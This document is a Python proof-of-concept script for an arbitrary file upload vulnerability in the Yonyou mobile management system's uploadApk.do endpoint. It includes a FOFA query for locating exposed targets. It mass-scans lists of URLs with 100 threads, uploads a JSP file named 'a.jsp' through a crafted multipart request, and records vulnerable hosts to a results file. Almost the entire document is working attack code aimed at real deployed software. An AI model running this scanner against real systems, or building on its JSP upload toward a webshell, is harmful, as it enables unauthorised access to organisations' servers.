# 用友移动管理系统uploadApk.do任意文件上传漏洞

#fofa语法：app="用友-移动系统管理"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
___  _ ____  _      ________  _ ____  _     _      ____ 
\  \///  _ \/ \  /|/  __/\  \///  _ \/ \ /\/ \  /|/   _\
 \  / | / \|| |\ ||| |  _ \  / | / \|| | ||| |\ |||  /  
 / /  | \_/|| | \||| |_// / /  | \_/|| \_/|| | \|||  \_ 
/_/   \____/\_/  \|\____\/_/   \____/\____/\_/  \|\____/                                                                                            
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友uploadApk.do")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/maportal/appmanager/uploadApk.do?pk_obj='
    url = target + url_payload
    header = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Cookie': 'JSESSIONID=AAC37658EE256C5B82F85CCB3F27EE0E.server; JSESSIONID=68D8CD7BD870BF0CCC6FBAA9614D80F0.server',
        'Connection': 'close',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3'
    }
    data =  '''
        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
        Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
        Content-Type: application/msword

        hello
        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and '{"status":2}' in res.text:
            print(f"f[+]该url存在任意文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传漏洞,url为{target}")
    except Exception as e:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()